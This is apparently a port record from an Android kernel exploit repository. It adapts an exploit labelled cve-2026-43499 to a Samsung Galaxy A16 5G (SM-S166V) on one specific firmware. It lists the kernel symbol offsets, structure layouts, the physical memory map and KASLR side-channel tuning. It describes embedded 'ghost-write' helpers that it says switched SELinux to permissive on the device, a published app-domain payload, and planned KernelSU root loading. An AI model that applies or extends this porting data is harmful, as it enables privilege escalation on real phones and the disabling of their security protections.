# Galaxy A16 5G SM-S166V / S166VUDU7DZE9 port record

## Identity

```text
model: SM-S166V (US T-Mobile, a16x)
SoC: Exynos 8535 (s5e8535, EVT 0.1)
AP/PDA: S166VUDU7DZE9
CSC: TFN
display build: BP4A.251205.006.S166VUDU7DZE9
fingerprint: samsung/a16xtfn/a16x:16/BP4A.251205.006/S166VUDU7DZE9:user/release-keys
Android: 16 (SDK 36)
page size: 4096
kernel release: 5.15.189-android13-3-33503169
kernel build: #1 SMP PREEMPT Wed May 13 22:04:15 KST 2026
```

The identity was confirmed from the device itself: the `FS/` dumpstate tree
(`ro.build.fingerprint`, `proc/version`, recovery `last_kernel`) and
`dumpstate_board.txt` (Focaltech `ft3419_a16x.bin` touch firmware, 6+2 CPU
topology). This is the first Exynos (s5e8535) 5.15.189 port in this repository; the
existing 5.15.189 references (dm3q, f731u) are both Qualcomm targets, so no
layout value was copied between them.

## Boot cmdline (from device)

```text
arm64.nomte ... cgroup_disable=pressure cgroup.memory=nokmem,nosocket
nokaslr kasan=off ... sec_debug ...
```

- `arm64.nomte` disables MTE; the profile keeps `KERNELSNITCH_MTE_ENABLED=0`.
- `cgroup.memory=nokmem` disables memcg kernel-memory accounting, so the
  device has no `kmalloc-cg-*` caches: `KMALLOC_CACHE_TYPES=2` (NORMAL,
  RECLAIM) and the pipe-buffer cache slot is type 1 (`kmalloc-rcl-2k`).
- 8 cores (6+2): `futex_hashsize = roundup_pow2(256*8) = 2048 = 0x800`.

## Symbol recovery

`vmlinux-to-elf` recovered symbols at image base `0xffffffc008000000`.
Every offset below was re-verified against `a16-files/vmlinux.nm` (absolute
address = `KIMAGE_TEXT_BASE + offset`).

| Macro/use | Target symbol/derivation | Offset |
| --- | --- | ---: |
| `CALL_USERMODEHELPER_EXEC_WORK_OFF` | `call_usermodehelper_exec_work` | `0x00100db8` |
| `NOOP_LLSEEK_OFF` | `noop_llseek` | `0x003b2200` |
| `COPY_SPLICE_READ_OFF` | `generic_file_splice_read` | `0x003fd120` |
| `CONFIGFS_READ_ITER_OFF` | `configfs_read_iter` | `0x00475e80` |
| `CONFIGFS_BIN_WRITE_ITER_OFF` | `configfs_bin_write_iter` | `0x0047633c` |
| `ASHMEM_IOCTL_OFF` | `ashmem_ioctl` | `0x00c61b44` |
| `ASHMEM_COMPAT_IOCTL_OFF` | `compat_ashmem_ioctl` | `0x00c620fc` |
| `ASHMEM_MMAP_OFF` | `ashmem_mmap` | `0x00c62154` |
| `ASHMEM_OPEN_OFF` | `ashmem_open` | `0x00c62390` |
| `ASHMEM_RELEASE_OFF` | `ashmem_release` | `0x00c62414` |
| `ASHMEM_SHOW_FDINFO_OFF` | `ashmem_show_fdinfo` | `0x00c62534` |
| `ANON_PIPE_BUF_OPS_OFF` | `anon_pipe_buf_ops` | `0x018f0760` |
| `ASHMEM_FOPS_OFF` | `ashmem_fops` | `0x01a6a198` |
| `KMALLOC_CACHES_OFF` | `kmalloc_caches` | `0x01abc4f0` |
| trace event start | `__start_ftrace_events` | `0x022c76c8` |
| blocked event | `__event_sched_blocked_reason` | `0x022c7988` |
| `SYSTEM_UNBOUND_WQ_OFF` | `system_unbound_wq` | `0x0230ae20` |
| `SLIDE_NFULNL_LOGGER_OBJECT_OFF` | `nfulnl_logger` | `0x02312598` |
| `INIT_TASK_OFF` | `init_task` | `0x0231fc40` |
| `SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF` | `.data` pointer slot in `random_table[]` `boot_id` entry | `0x02433178` |
| `ASHMEM_MISC_FOPS_OFF` | `ashmem_misc + offsetof(miscdevice, fops) = 0x02474240 + 0x10` | `0x02474250` |
| `ROOT_TASK_GROUP_OFF` | `root_task_group` | `0x02505f40` |
| `SELINUX_ENFORCING_OFF` | `selinux_state.enforcing` (`selinux_state` at `+0`) | `0x025d8f50` |
| `SLIDE_SYSCTL_BOOTID_OFF` | `sysctl_bootid` | `0x026be0c9` |
| `SLIDE_NFULNL_LOGGER_NAME_OFF` | `"nfnetlink_log"` string referenced by `nfulnl_logger.name` | `0x017f35b5` |
| `SLIDE_TRACEFS_WORKER_CALLER_OFF` | instruction after the blocking `worker_thread -> schedule` call | `0x001085c0` |

### Trace event ID

```text
__start_ftrace_events        = 0x022c76c8
__event_sched_blocked_reason = 0x022c7988
event_index = (0x022c7988 - 0x022c76c8) / 8 = 0x58 = 88   (zero-based)
__TRACE_LAST_TYPE            = 20                          (5.15 branch)
SLIDE_TRACEFS_EVENT_ID       = 20 + 88 = 108
```

This matches the known-working F731U 5.15.189 profile (`108`), as expected
for the same `android13-5.15` KMI branch.

## Layout constants

```text
MM_STRUCT_SZ = 0x400            slab object (BTF sizeof 0x3e0 misses slab alignment)
KMALLOC_CGROUP_TYPE = 1
KMALLOC_CACHE_TYPES = 2         no kmalloc-cg-* (cgroup.memory=nokmem)

COMPACT_RT_MUTEX_WAITER = 1
SLIDE_PSELECT_WORD_SHIFT = 3    same 5.15.189-android13 KMI as F731U
FAKE_WAITER_PI_TREE_ENTRY_OFF = 0x18
FAKE_WAITER_TASK_OFF = 0x30
FAKE_WAITER_LOCK_OFF = 0x38
FAKE_WAITER_WAKE_STATE_OFF = 0x40
FAKE_WAITER_PRIO_OFF = 0x44
FAKE_WAITER_DEADLINE_OFF = 0x48
FAKE_WAITER_WW_CTX_OFF = 0x50
FAKE_WAITER_LAYOUT_SIZE = 0x58

task_struct.usage = 0x38
task_struct.prio = 0x7c
task_struct.normal_prio = 0x84
task_struct.sched_task_group = 0x400
task_struct.pi_lock = 0x884
task_struct.pi_waiters = 0x898
task_struct.pi_top_task = 0x8a8
task_struct.pi_blocked_on = 0x8b0

struct page size = 0x40
page.compound_head = 0x08
page.slab_cache = 0x18
page.page_type = 0x30

workqueue_struct.dfl_pwq = 0xb0
pool_workqueue.nr_active = 0x5c
pool_workqueue.max_active = 0x60
worker_pool.worklist = 0x28
worker_pool.nr_idle = 0x3c

file_operations.unlocked_ioctl = 0x50
file_operations.compat_ioctl = 0x58
file_operations.mmap = 0x60
file_operations.open = 0x70
file_operations.release = 0x80
file_operations.splice_read = 0xc8
file_operations.show_fdinfo = 0xe0
```

KernelSnitch tuning: `KERNELSNITCH_FUTEX_HASH_SIZE=0x800` (8 cores),
`KERNELSNITCH_IDENTITY_START=0xffffff8000000000`,
`KERNELSNITCH_IDENTITY_END=0xffffff9000000000` (full 64 GB; narrowing was
observed to miss `sk_buff` objects), `KERNELSNITCH_VERBOSE=0` (printf inside
the ns-scale futex timing loop breaks the side channel).

## Physical map

```c
#define KIMAGE_TEXT_BASE    0xffffffc008000000ULL
#define P0_PAGE_OFFSET      0xffffff8000000000ULL
#define P0_PHYS_OFFSET      0x80000000ULL
#define P0_KERNEL_PHYS_LOAD 0x80000000ULL
#define DIRECT_MAP_BASE     0xffffff8000000000ULL
#define DIRECT_MAP_END      0xffffff9000000000ULL
#define VMEMMAP_START       0xfffffffe00000000ULL
#define SKB_DATA_DELTA      (-0xe80LL)
```

## Ghost-write helper (embedded standalone binaries)

The target directory additionally carries `ghost_permissive_bin.h` and
`ghost_write_helper_bin.h` — byte arrays of the stripped standalone
PI-chain ghost-write helpers built for this exact firmware (SM-S166V,
5.15.189-android13-3). `src/selinux_ghost.c` embeds them under
`SELINUX_GHOST_WRITE`. The helpers were confirmed working on this device
(the PI-chain stack aliasing only holds for the standalone call depth, so
they are exec'd from a clean address space).

The a16x app payload **enables** `SELINUX_GHOST_WRITE` — it is the primary
path for this device. The pselect/P0-oracle route does not work on this
kernel (reboots at page-prepare, `slide wait_requeue_pi` timeout), so
`run_exploit()` in ghost mode skips `slide_leak_kernel_base()` and lets the
embedded `selinux_permissive` binary perform its own tracefs KASLR leak and
flip. **Verified on-device 2026-08-12**: the repo payload flipped
`/sys/fs/selinux/enforce` 1 → 0 (Permissive) with `GHOST_ONLY=1`, no reboot.

Ghost-mode notes:
- `ghost_tracefs_kaslr()`'s retry loop must print misses with `pr_warning`
  (this codebase's `pr_error` calls `exit(-1)` → child dies at 255).
- The supervisor's p0-short-timeout is bypassed under `GHOST_ONLY` so the
  embedded child gets the full per-attempt budget.
- `GHOST_ONLY=1` stops after the flip (verification mode); without it the
  flow continues toward the (broken on this kernel) physrw pipeline.
- `SLIDE_MAX_CANDIDATE 0x1f0000` is required by `selinux_ghost.c`.

## P0 table and payload

`src/targets/a16x-S166VUDU7DZE9/p0_fingerprint.h` contains 32 slide rows
(`0x000000` through `0x1f0000`) generated from the a16x `vmlinux.elf`, with
the eight qwords at page offsets `0x000, 0x200, ..., 0xe00` per row.

The app-domain payload is published at
`artifacts/a16x-S166VUDU7DZE9/cve-2026-43499-app.so` (156,408 bytes). It is
the `-O2` app build (`make TARGET=a16x-S166VUDU7DZE9 ... all`) with
`SELINUX_GHOST_WRITE` enabled and the refreshed `ghost_permissive_bin.h`
embed (16,128 bytes, rebuilt from `selinux_permissive.c` with the NDK r29
toolchain and verified on-device). A fresh build is byte-identical to the
published file. The default `release` target truncates to the 104,128-byte
fixed size, so publishing a
release build requires an `APP_RELEASE_SIZE` override that matches the
shipped artifact.

## KernelSU

Pending. A KernelSU `android13-5.15.189` KO for the a16x kernel must be
built from KernelSU v3.2.5 + the Samsung KDP/RKP/DEFEX patch against a
`5.15.189-android13-3-33503169` tree (exact `vermagic`, empty `__versions`
for the late loader). The existing `dm3q-S9180ZHS8FZF5` 5.15.189 KO reports
vermagic `5.15.189-android13-8-33413713-abS9180ZHS8FZF5` and will not load on
this build; the fork's reuse of the 6.6 `ksud-s25u-kdp` for F731U is not a
pattern to copy. Until the a16x pair is built, the device is limited to the
volatile temporary root.

## Validation state

The profile is statically and build verified: every symbol offset above
matches `a16-files/vmlinux.nm`, the layout constants were cross-checked
against the known-working F731U 5.15.189 port and the device boot cmdline /
slab behavior, and the release payload was produced and copied to
`artifacts/`. Full exploit execution and KernelSU late-load on physical
`SM-S166V` hardware remain to be confirmed.
